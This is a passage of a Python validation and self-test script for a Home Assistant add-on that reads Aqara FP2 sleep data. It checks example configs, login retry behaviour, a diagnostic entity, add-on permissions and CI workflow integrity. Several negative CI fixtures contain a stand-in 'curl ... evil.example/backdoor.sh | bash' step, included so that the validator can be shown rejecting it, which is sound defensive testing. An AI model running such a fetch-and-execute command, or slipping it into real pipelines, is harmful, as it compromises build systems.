    if apex_map != INDICATIVE_DASHBOARD_PHASES:
        fail(
            "examples/dashboard-sleep.yaml ApexCharts map must contain only "
            f"indicative codes 3-5: {apex_map}"
        )
    if "Number(x) < 3" not in text:
        fail(
            "examples/dashboard-sleep.yaml must render unverified codes 0-2 "
            "as historical gaps"
        )


def check_automation_gates(text: str) -> None:
    automations = yaml.safe_load(text)
    if not isinstance(automations, list) or not automations:
        fail("examples/automations.yaml must contain a non-empty list")
    for automation in automations:
        if not isinstance(automation, dict):
            fail("examples/automations.yaml entries must be mappings")
        serialized = json.dumps(automation, sort_keys=True)
        uses_asleep_helper = "binary_sensor.fp2_asleep" in serialized
        uses_phase_helper = "sensor.fp2_sleep_phase" in serialized
        # An automation that only watches the diagnostic entity is not acting
        # on sleep data, so the occupancy gate has nothing to arbitrate. The
        # exemption is narrow on purpose: touch any sleep signal, raw sensor or
        # template helper, and the gate applies again, so this cannot be used
        # to smuggle in an ungated sleep automation.
        #
        # Matched on entity-id *suffix*, not on the default node id: a custom
        # mqtt_node_id (sensor.bedroom_fp2_sleep_state) is still sleep data,
        # and an earlier version of this check let that through.
        watches_diagnostics = "_connection_problem" in serialized
        without_diagnostics = serialized.replace("_connection_problem", "")
        touches_sleep_data = (
            uses_asleep_helper
            or uses_phase_helper
            or any(suffix in without_diagnostics for suffix in SLEEP_DATA_SUFFIXES)
        )
        if watches_diagnostics and not touches_sleep_data:
            continue
        if not (uses_asleep_helper or uses_phase_helper):
            fail(
                "examples/automations.yaml automation does not use an "
                "occupancy-gated helper"
            )
        if uses_phase_helper:
            if "Deep sleep (indicative)" not in serialized:
                fail(
                    "examples/automations.yaml phase automation must use an "
                    "indicative stage label"
                )
            if OCCUPANCY_ENTITY not in serialized:
                fail(
                    "examples/automations.yaml phase automation must include "
                    "an independent occupancy condition"
                )


def check_examples_readme_gate_contract(text: str) -> None:
    normalized = re.sub(r"\s+", " ", text)
    required = [
        OCCUPANCY_ENTITY,
        "must not be derived from",
        "fail closed",
        "Codes 0–2 never assert an in-bed stage",
        "codes 3–5 are indicative",
        "sensor-reported",
    ]
    missing = [fragment for fragment in required if fragment not in normalized]
    if missing:
        fail(
            "examples/README.md occupancy/evidence contract is missing: "
            + ", ".join(missing)
        )


def check_recorder_entities(text: str, expected_entity_ids, diagnostic_entity_id) -> None:
    data = yaml.safe_load(text) or {}
    entities = set((data.get("include") or {}).get("entities") or [])
    # The diagnostic entity is recorded alongside the vitals so a past outage
    # still comes with a reason after the retained state has moved on.
    expected = set(expected_entity_ids) | {diagnostic_entity_id}
    if entities != expected:
        fail(
            "examples/recorder.yaml include list drifted from the published "
            f"entities. expected {sorted(expected)}, got {sorted(entities)}"
        )


def validate_phase_semantics() -> None:
    check_card_phase_semantics((ROOT / "card/sleepradar-card.js").read_text())
    check_readme_phase_table((ROOT / "README.md").read_text())
    check_sleep_tracking_maps((ROOT / "examples/sleep_tracking.yaml").read_text())
    check_dashboard_maps((ROOT / "examples/dashboard-sleep.yaml").read_text())
    check_automation_gates((ROOT / "examples/automations.yaml").read_text())
    check_examples_readme_gate_contract((ROOT / "examples/README.md").read_text())


def check_login_failure_falls_through_to_retry_loop() -> None:
    install_import_stubs()
    module_path = ROOT / "aqara_fp2_sleep/aqara_fp2_sleep_poller.py"
    spec = importlib.util.spec_from_file_location("poller_login_self_test", module_path)
    if spec is None or spec.loader is None:
        fail("could not load poller module for login failure self-test")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    events = []

    class FakeClient:
        def publish(self, *args, **kwargs):
            events.append(("publish", args, kwargs))

        def loop_stop(self):
            events.append(("loop_stop",))

        def disconnect(self):
            events.append(("disconnect",))

    class FakeAqara:
        def __init__(self, area):
            events.append(("aqara", area))

        def login(self):
            events.append(("login",))
            return False

        def res_query(self, did, options):
            events.append(("res_query", did, tuple(options)))
            return {"code": 401, "message": "bad credentials"}

    def fake_sleep(seconds):
        events.append(("sleep", seconds))
        module._running = False
        return False

    module.make_mqtt = lambda: FakeClient()
    module.publish_discovery = lambda client: events.append(("discovery",))
    module.Aqara = FakeAqara
    module.interruptible_sleep = fake_sleep
    module.log = lambda level, msg: events.append(("log", level, msg))
    module.USER = "user"
    module.PASSWORD = "password"
    module.SUBJECT = "did"
    module._running = True

    try:
        module.main()
    except SystemExit as exc:
        fail(f"startup login failure must not exit immediately: {exc}")

    # The log level matters here. This path keeps running and recovers on its
    # own once the options are corrected, so "fatal" told users to expect a
    # crash that never came, and buried the one line that names the fix.
    hints = [
        event
        for event in events
        if event[0] == "log" and "Aqara login failed at startup" in event[2]
    ]
    if not hints:
        fail("startup login failure did not log the startup hint")
    if any(event[1] == "fatal" for event in hints):
        fail(
            "startup login failure must not log at fatal: the process keeps "
            "running and retries"
        )
    if not any(event[1] == "error" for event in hints):
        fail("startup login failure must log the startup hint at error level")
    if not any(event[0] == "res_query" for event in events):
        fail("startup login failure did not fall through to the retry poll loop")
    # A login the user has to fix is published as a problem, not only logged.
    # That is what the diagnostic entity is for.
    if not any(
        event[0] == "publish" and event[1] and event[1][0] == module.PROBLEM_STATE_TOPIC
        and event[1][1] == "ON"
        for event in events
    ):
        fail("a rejected login did not publish ON to the problem topic")


def check_failure_classification() -> None:
    module = load_poller_module("poller_failure_classification")

    if not module.is_transient_code(-1):
        fail("code -1 (socket/DNS/timeout) must be transient")
    for code in (429, 500, 503):
        if not module.is_transient_code(code):
            fail(f"HTTP {code} must be transient")
    if module.is_transient_code(module.AQARA_CODE_ACCOUNT_REJECTED):
        fail("code 106 is Aqara saying no; it must not be transient")

    kind, cause = module.describe_login_failure(
        {"code": -1, "message": "URLError: <urlopen error [Errno -3] Try again>"}
    )
    if kind != "transient":
        fail(f"URLError must classify as transient, got {kind}")

    kind, cause = module.describe_login_failure(
        {"code": 106, "message": "Request failed. Please try again."}, area="USA"
    )
    if kind != "permanent":
        fail(f"code 106 must classify as permanent, got {kind}")
    # Aqara's own text for 106 is "Request failed. Please try again.", which
    # sends users to retry forever. The cause must name the region instead.
    if "USA" not in cause or "aqara_area" not in cause:
        fail(f"code 106 cause must name the configured region and option: {cause}")

    # Signed in, but the device query was rejected: different fix entirely.
    _kind, cause = module.describe_failure({"code": 108, "message": "no"}, True)
    if "subject_id" not in cause:
        fail(f"a rejected query on a good session must point at subject_id: {cause}")

    # code 0 means Aqara answered; we just could not read the payload. Calling
    # that a rejected sign-in suspends polling for up to 30 minutes and tells
    # the user their credentials are wrong when they are not.
    for login_ok in (True, False):
        kind, cause = module.describe_failure({"code": 0, "result": {"x": 1}}, login_ok)
        if kind != "transient":
            fail(
                f"code 0 with an unreadable payload must be transient "
                f"(login_ok={login_ok}), got {kind}: {cause}"
            )
        if "rejected the sign-in" in cause or "subject_id" in cause:
            fail(f"code 0 must not be described as an auth failure: {cause}")


def check_problem_entity_is_independent() -> None:
    """The diagnostic entity must survive the outage it describes."""
    module = load_poller_module("poller_problem_entity")
    payload = module.problem_discovery_payload()
    json.dumps(payload)

    if "availability_topic" in payload:
        fail(
            "the problem entity must not hang off AVAIL_TOPIC: it would go "
            "unavailable at the moment its reason is needed"
        )
    if "expire_after" in payload:
        fail(
            "the problem entity must not expire; process death is covered by "
            "the MQTT will instead"
        )
    if payload.get("device_class") != "problem":
        fail("the problem entity must use device_class: problem")
    if payload.get("entity_category") != "diagnostic":
        fail("the problem entity must be entity_category: diagnostic")
    if payload.get("state_topic") == module.AVAIL_TOPIC:
        fail("the problem entity must not publish on the vitals availability topic")
    if payload.get("json_attributes_topic") != module.PROBLEM_ATTR_TOPIC:
        fail("the problem entity must expose its cause via json_attributes_topic")

    # The will is the only thing that flags an ungraceful death, since this
    # entity has no expire_after.
    wills = []

    class WillClient:
        def will_set(self, topic, payload=None, qos=0, retain=False):
            wills.append((topic, payload, retain))

        def username_pw_set(self, *args, **kwargs):
            pass

        def tls_set(self, *args, **kwargs):
            pass

        def connect(self, *args, **kwargs):
            pass

        def loop_start(self):
            pass

    # module.mqtt is the shared import stub, so restore it or every later
    # check sees this fake.
    original_client = module.mqtt.Client
    try:
        module.mqtt.Client = lambda *args, **kwargs: WillClient()
        module.make_mqtt()
    finally:
        module.mqtt.Client = original_client
    if (module.PROBLEM_STATE_TOPIC, "ON", True) not in wills:
        fail(f"MQTT will must flag a problem on ungraceful death, got {wills}")

    # A correct payload is not enough: Home Assistant only creates the entity
    # if the discovery message actually goes out.
    discovery = []

    class DiscoveryClient:
        def publish(self, topic, payload=None, qos=0, retain=False):
            discovery.append((topic, payload, retain))

    original_log = module.log
    try:
        module.log = lambda level, msg: None
        module.publish_discovery(DiscoveryClient())
    finally:
        module.log = original_log
    expected_topic = (
        f"{module.DISCOVERY_PREFIX}/binary_sensor/{module.NODE}/"
        "connection_problem/config"
    )
    published = [entry for entry in discovery if entry[0] == expected_topic]
    if not published:
        fail(
            f"publish_discovery never published the problem entity to "
            f"{expected_topic}; got {sorted({t for t, _, _ in discovery})}"
        )
    if not published[0][2]:
        fail("the problem entity's discovery message must be retained")
    if json.loads(published[0][1]).get("device_class") != "problem":
        fail("the published problem discovery payload lost its device_class")


def check_health_grace_and_notifications() -> None:
    module = load_poller_module("poller_health")

    published = []
    notifications = []

    class FakeClient:
        def publish(self, topic, payload=None, qos=0, retain=False):
            published.append((topic, payload))

    module.notify_problem = lambda cause: notifications.append(("create", cause))
    module.clear_problem_notification = lambda: notifications.append(("dismiss", None))
    module.log = lambda level, msg: None

    health = module.Health(FakeClient())

    # A single DNS blip must not raise a notification, and the flag must fire
    # on the Nth consecutive failure rather than merely "eventually".
    grace = module.TRANSIENT_FAILURE_GRACE
    for attempt in range(1, grace + 1):
        health.failed("transient", "cannot reach Aqara", -1)
        if attempt < grace and notifications:
            fail(
                f"transient failure {attempt}/{grace} raised a notification "
                "before the grace window elapsed"
            )
        if attempt == grace and not notifications:
            fail(f"the {grace}th consecutive transient failure must be flagged")
    raised = len(notifications)
    published_during_outage = len(published)
    health.failed("transient", "cannot reach Aqara", -1)
    if len(notifications) != raised:
        fail("an ongoing problem must not re-notify every poll interval")
    # Same reasoning as the healthy path: the payload is retained and nothing
    # in it changed, so republishing writes a Recorder row per poll for the
    # entire outage.
    if len(published) != published_during_outage:
        fail(
            "an unchanged ongoing problem must not republish the retained "
            f"payload; got {published[published_during_outage:]}"
        )

    # A blip that turns out to be a rejected region must update the text, on
    # the surface the user actually reads: "wait, it clears on its own" and
    # "fix your region" call for different actions.
    health.failed("permanent", "Aqara rejected the sign-in (code 106)", 106)
    if len(notifications) == raised:
        fail("a changed cause must update the notification, not keep the old text")
    if "106" not in (notifications[-1][1] or ""):
        fail(f"the updated notification must carry the new cause: {notifications[-1]}")

    health.recovered()
    if notifications[-1][0] != "dismiss":
        fail("recovery must dismiss the notification it raised")
    if (module.PROBLEM_STATE_TOPIC, "OFF") not in published:
        fail("recovery must publish OFF to the problem topic")

    # Steady-state healthy polls must be silent. The attributes carry a
    # last_successful_poll timestamp, so republishing them every interval
    # writes a retained update per poll, 1440 a day, to an entity this repo
    # recommends for Recorder.
    published.clear()
    notifications.clear()
    for _ in range(5):
        health.recovered()
    if published:
        fail(
            "an already-healthy poll must not republish the problem topic; "
            f"got {published}"
        )
    if notifications:
        fail(f"an already-healthy poll must not touch notifications: {notifications}")

    # A rejected credential is flagged immediately: retrying cannot fix it.
    fresh = module.Health(FakeClient())
    notifications.clear()
    fresh.failed("permanent", "Aqara rejected the sign-in", 106)
    if not notifications:
        fail("a permanent failure must be flagged on the first occurrence")


def check_auth_backoff_schedule() -> None:
    """The gap between sign-in attempts must match AUTH_RETRY_BACKOFF.

    The poll loop sleeps one INTERVAL at the end of every iteration, so a
    naive `auth_wait = auth_delay` produces a real gap of auth_delay+INTERVAL
    and a countdown log that understates the wait.
    """
    module = load_poller_module("poller_backoff")
    interval = module.INTERVAL

    # Drive the real main() loop. Reimplementing the schedule here would pin
    # the intention while leaving the loop free to drift away from it.
    clock = {"t": 0}
    attempts = []

    class FakeClient:
        def publish(self, *args, **kwargs):
            pass

        def loop_stop(self):
            pass

        def disconnect(self):
            pass

    class RejectingAqara:
        def __init__(self, area):
            self.last_error = None

        def login(self):
            attempts.append(clock["t"])
            self.last_error = {"code": 106, "message": "Request failed."}
            return False

        def res_query(self, did, options):
            return {"code": 106, "message": "Request failed."}

    def fake_sleep(seconds):
        clock["t"] += seconds
        if clock["t"] > 20000:
            module._running = False
        return module._running

    module.make_mqtt = lambda: FakeClient()
    module.publish_discovery = lambda client: None
    module.Aqara = RejectingAqara
    module.interruptible_sleep = fake_sleep
    module.log = lambda level, msg: None
    module.notify_problem = lambda cause: True
    module.clear_problem_notification = lambda: True
    module.USER, module.PASSWORD, module.SUBJECT = "u", "p", "did"
    module._running = True
    module.main()

    if len(attempts) < 5:
        fail(f"expected several sign-in attempts to measure, got {len(attempts)}")
    # Drop the startup login: it precedes the loop and has no backoff.
    gaps = [b - a for a, b in zip(attempts[1:], attempts[2:])]
    expected, delay = [], module.AUTH_RETRY_BACKOFF
    while len(expected) < len(gaps):
        expected.append(max(delay, interval))
        delay = min(delay * 2, module.AUTH_RETRY_BACKOFF_MAX)
    if gaps != expected:
        fail(f"auth backoff gaps {gaps[:6]} do not match the schedule {expected[:6]}")
    if max(gaps) > module.AUTH_RETRY_BACKOFF_MAX:
        fail(f"auth backoff exceeded its cap: {max(gaps)}s")


def check_notification_failure_is_soft() -> None:
    """Losing a notification must never take the poller down."""
    module = load_poller_module("poller_notify_soft")
    module.SUPERVISOR_TOKEN = "test-token"
    module.log = lambda level, msg: None

    def boom(*args, **kwargs):
        raise OSError("supervisor proxy refused the call")

    # urllib is the real stdlib module, shared by every later check.
    original_urlopen = module.urllib.request.urlopen
    try:
        module.urllib.request.urlopen = boom
        if (
            module.call_core_service("persistent_notification", "create", {})
            is not False
        ):
            fail("a refused core API call must report failure, not success")
    finally:
        module.urllib.request.urlopen = original_urlopen

    module.SUPERVISOR_TOKEN = ""
    if module.call_core_service("persistent_notification", "create", {}) is not False:
        fail("call_core_service must no-op without a Supervisor token")

    # An undelivered notification is itself an outage the user cannot see, so
    # it belongs at warning rather than swallowed at debug.
    logged = []
    module.log = lambda level, msg: logged.append((level, msg))
    module.call_core_service = lambda domain, service, payload: False
    if module.notify_problem("Aqara rejected the sign-in") is not False:
        fail("notify_problem must report an undelivered notification")
    warnings = [msg for level, msg in logged if level == "warning"]
    if not warnings:
        fail(
            "a notification that could not be delivered must log at warning, "
            f"got {logged}"
        )
    if not any("Configuration" in msg for msg in warnings):
        fail(f"the warning must name the re-approval step: {warnings}")


def check_addon_permissions(config=None) -> None:
    """Pin the add-on's permission surface.

    This add-on holds Aqara cloud credentials. Every one of these keys widens
    what a compromise reaches, so changing one has to be an edit here and not
    only a flip in config.yaml.
    """
    if config is None:
        config = yaml.safe_load((ROOT / "aqara_fp2_sleep/config.yaml").read_text())
    expected = {
        # Granted: raises and dismisses the persistent notification naming why
        # the Aqara connection is down. Nothing else uses it.
        "homeassistant_api": True,
        "hassio_api": False,
    }
    for key, want in expected.items():
        got = config.get(key, False)
        if got != want:
            fail(
                f"add-on permission {key} is {got!r}, expected {want!r}. "
                "A permission change needs a matching update to "
                "check_addon_permissions in the same commit."
            )
    for key in ("host_network", "host_pid", "privileged", "full_access", "auth_api"):
        if config.get(key):
            fail(f"add-on must not request {key}")


def run_self_test() -> None:
    failures = []

    def expect_pass(name, fn):
        try:
            fn()
        except Exception as exc:  # noqa: BLE001 - reports any unexpected failure
            failures.append(f"{name}: unexpected {type(exc).__name__}: {exc}")

    def expect_fail(name, fn):
        try:
            fn()
        except ValidationError:
            return
        except Exception as exc:  # noqa: BLE001
            failures.append(
                f"{name}: raised {type(exc).__name__} instead of ValidationError ({exc})"
            )
            return
        failures.append(f"{name}: expected ValidationError, none raised")

    def expect_fail_matching(name, fn, needle):
        """Require a ValidationError whose message contains `needle`.

        expect_fail() only type-checks, so a fixture that trips a *different*
        guard than the one under test still passes. Use this where several
        guards reject the same input and only one of them is being pinned.
        """

        try:
            fn()
        except ValidationError as exc:
            if needle not in str(exc):
                failures.append(
                    f"{name}: raised ValidationError without {needle!r} ({exc})"
                )
            return
        except Exception as exc:  # noqa: BLE001
            failures.append(
                f"{name}: raised {type(exc).__name__} instead of ValidationError ({exc})"
            )
            return
        failures.append(f"{name}: expected ValidationError, none raised")

    def build_fixture(name, fn):
        """Build a mutation fixture without aborting the whole self-test.

        These builders parse the real ci.yml and settings.toml. Calling them
        bare let a ValidationError escape run_self_test() entirely, discarding
        every failure collected so far — exactly when several are most likely.
        """

        try:
            return fn()
        except ValidationError as exc:
            failures.append(f"{name}: fixture unavailable, mutations skipped ({exc})")
            return None

    card = (ROOT / "card/sleepradar-card.js").read_text()
    readme = (ROOT / "README.md").read_text()
    tracking = (ROOT / "examples/sleep_tracking.yaml").read_text()
    dashboard = (ROOT / "examples/dashboard-sleep.yaml").read_text()
    automations = (ROOT / "examples/automations.yaml").read_text()
    examples_readme = (ROOT / "examples/README.md").read_text()
    recorder = (ROOT / "examples/recorder.yaml").read_text()
    ghost_vitals_fixture = (ROOT / GHOST_VITALS_FIXTURE).read_text()
    run_script = (ROOT / "aqara_fp2_sleep/run.sh").read_text()
    conductor_settings = (ROOT / ".conductor/settings.toml").read_text()
    addon_config = yaml.safe_load((ROOT / "aqara_fp2_sleep/config.yaml").read_text())
    favicon_source = (ROOT / FAVICON_SOURCE).read_bytes()
    favicon = (ROOT / FAVICON_PATH).read_bytes()
    entity_ids = {f"sensor.{oid}" for oid in EXPECTED_OBJECT_IDS}
    diagnostic_entity_id = "binary_sensor.aqara_fp2_sleep_connection_problem"
    published_paths = [
        "assets/feature-gifs/example.gif",
        "assets/feature-gifs/example.mp4",
        "videos/example/index.html",
    ]

    expect_pass("favicon real", lambda: check_favicon(favicon_source, favicon))
    expect_pass("addon config real", lambda: validate_addon_config(addon_config))
    expect_pass(
        "addon config URL watchdog",
        lambda: validate_addon_config(
            dict(addon_config, watchdog="http://[HOST]:[PORT:8080]/health")
        ),
    )
    expect_pass("run script real", lambda: validate_run_script(run_script))
    expect_pass(
        "conductor settings real",
        lambda: validate_conductor_settings(conductor_settings),
    )
    expect_pass("card real", lambda: check_card_phase_semantics(card))
    expect_pass("readme real", lambda: check_readme_phase_table(readme))
    expect_pass("sleep_tracking real", lambda: check_sleep_tracking_maps(tracking))
    expect_pass("dashboard real", lambda: check_dashboard_maps(dashboard))
    expect_pass("automations real", lambda: check_automation_gates(automations))
    expect_pass(
        "examples readme real",
        lambda: check_examples_readme_gate_contract(examples_readme),
    )
    expect_pass(
        "recorder real",
        lambda: check_recorder_entities(recorder, entity_ids, diagnostic_entity_id),
    )
    expect_pass(
        "ghost-vitals evidence real",
        lambda: check_ghost_vitals_evidence(ghost_vitals_fixture, readme),
    )
    expect_pass(
        "tracked published pair",
        lambda: validate_tracked_paths(published_paths),
    )
    expect_pass(
        "privacy scan covers authored markup",
        lambda: (
            None
            if {".html", ".svg"} <= TEXT_SUFFIXES
            else fail("TEXT_SUFFIXES must include .html and .svg")
        ),
    )
    expect_fail(
        "private occupancy entity",
        lambda: check_private_strings_in_text(
            "example.md", "entity: sensor.bedroom_bed_status"
        ),
    )
    expect_pass(
        "neutral occupancy entity",
        lambda: check_private_strings_in_text(
            "example.md", f"entity: {OCCUPANCY_ENTITY}"
        ),
    )
    expect_pass(
        "login failure retry loop",
        check_login_failure_falls_through_to_retry_loop,
    )
    expect_pass("failure classification", check_failure_classification)
    expect_pass("problem entity independence", check_problem_entity_is_independent)
    expect_pass("health grace and notifications", check_health_grace_and_notifications)
    expect_pass("auth backoff schedule", check_auth_backoff_schedule)
    expect_pass("notification fails soft", check_notification_failure_is_soft)
    # The exemption in check_automation_gates was the one guard with no
    # negative fixture, and it was too broad: it keyed off the default node id,
    # so a custom mqtt_node_id smuggled an ungated sleep automation past it.
    expect_fail_matching(
        "diagnostic exemption does not cover sleep data on a custom node id",
        lambda: check_automation_gates(
            yaml.safe_dump(
                [
                    {
                        "alias": "ungated",
                        "trigger": [
                            {
                                "platform": "state",
                                "entity_id": "binary_sensor.bedroom_fp2_connection_problem",
                                "to": "on",
                            }
                        ],
                        "condition": [
                            {
                                "condition": "state",
                                "entity_id": "sensor.bedroom_fp2_sleep_state",
                                "state": "3",
                            }
                        ],
                        "action": [{"service": "light.turn_on"}],
                    }
                ]
            )
        ),
        "occupancy-gated helper",
    )
    expect_pass("addon permissions real", lambda: check_addon_permissions(addon_config))
    expect_fail_matching(
        "addon permission flipped without updating the guard",
        lambda: check_addon_permissions({**addon_config, "hassio_api": True}),
        "hassio_api",
    )
    expect_fail_matching(
        "addon requesting host network",
        lambda: check_addon_permissions({**addon_config, "host_network": True}),
        "host_network",
    )

    def mutate(text, old, new):
        if old not in text:
            failures.append(f"self-test anchor not found: {old!r}")
        return text.replace(old, new)

    def dashboard_with_duplicate_now_section():
        data = copy.deepcopy(yaml.safe_load(dashboard))
        sections = data[0]["sections"]
        now_section = next(
            section
            for section in sections
            if any(
                isinstance(card, dict) and card.get("heading") == "Now"
                for card in section.get("cards") or []
            )
        )
        sections.append(copy.deepcopy(now_section))
        return yaml.safe_dump(data, sort_keys=False)

    def dashboard_with_duplicate_live_card():
        data = copy.deepcopy(yaml.safe_load(dashboard))
        sections = data[0]["sections"]
        now_section = next(
            section
            for section in sections
            if any(
                isinstance(card, dict) and card.get("heading") == "Now"
                for card in section.get("cards") or []
            )
        )
        live_card = next(
            card
            for card in now_section["cards"]
            if isinstance(card, dict) and card.get("type") == "custom:sleepradar-card"
        )
        now_section["cards"].append(copy.deepcopy(live_card))
        return yaml.safe_dump(data, sort_keys=False)
    def conductor_command_fixtures(conductor_command):
        structured_conductor_settings = (
            "[scripts]\n"
            'setup = "true"\n'
            "[scripts.run.validate]\n"
            f"command = {json.dumps(conductor_command)}\n"
        )
        expect_pass(
            "structured conductor settings",
            lambda: validate_conductor_settings(structured_conductor_settings),
        )
        # Flat form: [scripts.run] command = "..." (no per-name sub-table). Only
        # the structured [scripts.run.<name>] form was previously covered.
        flat_conductor_settings = (
            "[scripts]\n"
            'setup = "true"\n'
            "[scripts.run]\n"
            f"command = {json.dumps(conductor_command)}\n"
        )
        expect_pass(
            "flat conductor settings",
            lambda: validate_conductor_settings(flat_conductor_settings),
        )
        expect_fail(
            "multiple conductor run commands",
            lambda: validate_conductor_settings(
                structured_conductor_settings
                + "\n[scripts.run.decoy]\n"
                + 'command = "exit 0"\n'
            ),
        )
        # Unrecognized shapes were silently skipped, so an extra runnable entry
        # could sit beside the validated one while the count still read 1.
        expect_fail(
            "conductor extra run entry with non-string command",
            lambda: validate_conductor_settings(
                structured_conductor_settings
                + "\n[scripts.run.decoy]\n"
                + 'command = ["bash", "-c", "exit 0"]\n'
            ),
        )
        # The flat form's own `command` key must fail closed too: skipping a
        # non-string value left the count at 1 (the named entry below), so the
        # list form Conductor would actually run went entirely unvalidated.
        expect_fail(
            "conductor flat non-string command beside a valid entry",
            lambda: validate_conductor_settings(
                "[scripts]\n"
                'setup = "true"\n'
                "[scripts.run]\n"
                'command = ["bash", "-c", "exit 0"]\n'
                "[scripts.run.validate]\n"
                f"command = {json.dumps(conductor_command)}\n"
            ),
        )
        expect_fail(
            "conductor flat form with stray sibling key",
            lambda: validate_conductor_settings(
                flat_conductor_settings + 'decoy = "exit 0"\n'
            ),
        )
        # args/options/available_in change what Conductor actually executes, so
        # a matching command string alone is not proof the gates run.
        expect_fail(
            "conductor run entry with execution-altering keys",
            lambda: validate_conductor_settings(
                structured_conductor_settings + 'args = ["||", "true"]\n'
            ),
        )
        # A line-oriented parser accepted the gate text inside a multi-line
        # string even with no run key present at all. Real TOML parsing must
        # reject it.
        expect_fail(
            "conductor multiline string decoy",
            lambda: validate_conductor_settings(
                "[scripts]\n"
                'setup = "true"\n'
                'note = """\n'
                f"run = {json.dumps(conductor_command)}\n"
                '"""\n'
            ),
        )
        # A decoded newline is a shell command terminator; whitespace
        # normalization must not fold it into a space and call the broken
        # chain a match.
        newline_command = conductor_command.replace("git diff", "git\ndiff", 1)
        expect_fail(
            "conductor embedded newline in command",
            lambda: validate_conductor_settings(
                f"[scripts]\nrun = {json.dumps(newline_command)}\n"
            ),
        )
        expect_fail(
            "conductor settings invalid toml",
            lambda: validate_conductor_settings(
                f"[scripts\nrun = {json.dumps(conductor_command)}\n"
            ),
        )
        # The decoy must not be mistaken for the real gate chain: a baseline
        # gate is removed, so passing would mean an unrelated table satisfied
        # the check.
        conductor_settings_with_decoy = (
            mutate(conductor_settings, f" && {CONDUCTOR_BASELINE_COMMAND}", "")
            + "\n[unrelated]\n"
            + f"command = {json.dumps(conductor_command)}\n"
        )
        expect_fail(
            "conductor settings ignores unrelated command decoy",
            lambda: validate_conductor_settings(conductor_settings_with_decoy),
        )

    conductor_command = build_fixture(
        "conductor run command fixture",
        lambda: conductor_run_commands(conductor_settings)[0],
    )
    if conductor_command is not None:
        conductor_command_fixtures(conductor_command)

    # A gate run by some other workspace-venv tool has no CI translation;
    # falling through would emit a pattern demanding `.venv/...` in ci.yml,
    # which CI could never satisfy.
    expect_fail(
        "ci pattern for an untranslated .venv tool",
        lambda: ci_run_pattern(".venv/bin/node tests/sleepradar-card.test.js"),
    )
    expect_fail(
        "conductor settings missing scripts table",
        lambda: validate_conductor_settings("[other]\nfoo = 1\n"),
    )
    expect_fail(
        "conductor settings run wrong type",
        lambda: validate_conductor_settings("[scripts]\nrun = 1\n"),
    )
    # Same gate set, different order: exercises the "gate order differs" branch,
    # which the missing/unexpected cases never reach.
    reordered = list(CONDUCTOR_REQUIRED_COMMANDS)
    reordered[-1], reordered[-2] = reordered[-2], reordered[-1]

    base_workflow = build_fixture("ci.yml workflow fixture", load_workflow)
    if base_workflow is not None:
        # The permissions guard used to live only on the file-reading path, so
        # no fixture could reach it and it could decay unnoticed.
        expect_pass(
            "workflow permissions real",
            lambda: validate_workflow_permissions(base_workflow),
        )
        expect_fail(
            "workflow permissions widened",
            lambda: validate_workflow_permissions(
                dict(base_workflow, permissions={"contents": "write"})
            ),
        )
        expect_fail(
            "workflow permissions missing",
            lambda: validate_workflow_permissions(
                {
                    key: value
                    for key, value in base_workflow.items()
                    if key != "permissions"
                }
            ),
        )

    base_jobs = build_fixture("ci.yml jobs fixture", workflow_jobs)

    def workflow_fixtures(base_jobs):
        def workflow_with(job, mutate_steps):
            mutated = copy.deepcopy(base_jobs)
            mutated[job]["steps"] = mutate_steps(mutated[job]["steps"])
            return mutated

        def set_step_run(steps, name, run):
            for step in steps:
                if step.get("name") == name:
                    step["run"] = run
            return steps

        def set_step_env(steps, name, env):
            for step in steps:
                if step.get("name") == name:
                    step["env"] = env
            return steps

        expect_pass(
            "workflow real",
            lambda: validate_workflow(copy.deepcopy(base_jobs)),
        )
        # An unanchored guard let this pass: CI would run the self-test twice and
        # never run real package validation, while the drift check stayed green.
        expect_fail(
            "workflow validate step running the self-test instead",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: set_step_run(
                        steps,
                        "Validate add-on package",
                        "python scripts/validate_repository.py --self-test",
                    ),
                )
            ),
        )
        # A new CI gate must also be a documented local gate, or Conductor and
        # CONTRIBUTING.md silently lag behind CI.
        expect_fail(
            "workflow gate absent from the documented local chain",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: steps
                    + [{"name": "Undocumented extra gate", "run": "python -c pass"}],
                )
            ),
        )
        # step_by_name()/step_run() only ever inspect the first match for a given
        # name, so a duplicate step name could smuggle an unvalidated command past
        # every check keyed on that name. Reusing a real gate's name must fail
        # even though the first occurrence is untouched and legitimate.
        expect_fail(
            "workflow duplicate step name bypass",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: steps
                    + [
                        {
                            "name": "Validate add-on package",
                            "run": "curl -s https://evil.example/backdoor.sh | bash",
                        }
                    ],
                )
            ),
        )
        # jobs.security and jobs.docker-build go through the same
        # require_known_run_steps() loop as jobs.validate; a brand-new,
        # non-duplicate-named step in either must still be rejected.
        expect_fail(
            "workflow unknown security step",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: steps
                    + [
                        {
                            "name": "Totally new unrelated security step",
                            "run": "curl -s https://evil.example/backdoor.sh | bash",
                        }
                    ],
                )
            ),
        )
        expect_fail(
            "workflow unknown docker-build step",
            lambda: validate_workflow(
                workflow_with(
                    "docker-build",
                    lambda steps: steps
                    + [
                        {
                            "name": "Totally new unrelated docker step",
                            "run": "curl -s https://evil.example/backdoor.sh | bash",
                        }
                    ],
                )
            ),
        )
        # workflow_with() only mutates steps within an existing job, so an
        # entirely new job needs its own fixture: a brand-new, undocumented job
        # must fail even though validate/security/docker-build are all present
        # and untouched.
        expect_fail(
            "workflow undocumented extra job",
            lambda: validate_workflow(
                dict(
                    copy.deepcopy(base_jobs),
                    deploy={
                        "runs-on": "ubuntu-latest",
                        "steps": [
                            {
                                "name": "Totally new deploy step",
                                "run": "curl -s https://evil.example/backdoor.sh | bash",
                            }
                        ],
                    },
                )
            ),
        )
        # The Gitleaks config self-test step must prove BOTH control directions.
        # Dropping just the "exit 1" (the positive-control failure branch) must
        # still be caught, or this step could be weakened to a no-op scan.
        expect_fail(
            "workflow gitleaks config self-test missing positive control",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: set_step_run(
                        steps,
                        "Self-test repo config detects and excludes correctly",
                        # The trap must name both planted paths, or this fixture
                        # fails on the trap marker instead of the missing
                        # `exit 1` and stops covering the positive control.
                        "trap 'rm -rf .gitleaks-selftest "
                        ".gstack/gitleaks-generated-state-self-test.json' EXIT\n"
                        "mkdir -p .gitleaks-selftest\n"
